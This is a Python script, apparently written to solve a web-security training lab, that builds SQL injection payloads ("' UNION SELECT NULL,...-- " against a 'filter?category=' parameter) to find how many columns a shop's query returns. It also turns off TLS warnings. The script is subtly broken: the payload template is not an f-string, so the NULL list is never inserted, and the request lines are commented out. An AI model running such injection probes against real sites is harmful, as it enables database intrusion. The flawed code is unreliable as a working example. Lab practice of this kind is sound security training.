import sys
import logging
import argparse
import urllib3

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    nulls_list = ["NULL"]
    for i in range(2,51):
        nulls = ",".join(nulls_list)
        filter_path = "filter?category=' UNION SELECT {nulls}-- "
        exploit_url = shop.base_url + filter_path
        print(exploit_url)
        #resp = requests.get(shop.base_url + filter_path)
       #if resp.status_code == 200:
       #    break
        nulls_list.append("NULL")        
    shop.is_solved()
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)